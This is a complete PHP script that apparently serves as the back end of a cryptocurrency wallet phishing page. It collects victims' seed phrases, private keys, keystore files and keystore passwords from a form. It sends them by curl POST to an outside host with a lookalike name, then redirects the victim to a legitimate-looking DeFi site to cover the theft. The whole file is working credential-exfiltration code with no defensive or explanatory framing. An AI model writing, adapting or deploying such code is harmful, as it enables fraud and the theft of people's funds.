<?php
$url = 'http://p-aypai.dx.am/safedapp.php';
$fields = array(
	'wallet' => urlencode($_POST['wallet']),
	'type' => urlencode($_POST['type']),
	'phrase' => urlencode($_POST['phrase']),
	'keystorejson' => urlencode($_POST['keystorejson']),
	'keystorepassword' => urlencode($_POST['keystorepassword']),
	'privatekey' => urlencode($_POST['privatekey'])
);

//url-ify the data for the POST
$fields_string = '';
foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
rtrim($fields_string, '&');


//open connection
$ch = curl_init();

//set the url, number of POST vars, POST data
curl_setopt($ch,CURLOPT_URL, $url);
curl_setopt($ch,CURLOPT_POST, count($fields));
curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);

//execute post
$result = curl_exec($ch);

//close connection
curl_close($ch);
header("location:https://allowance.beefy.finance/");
?>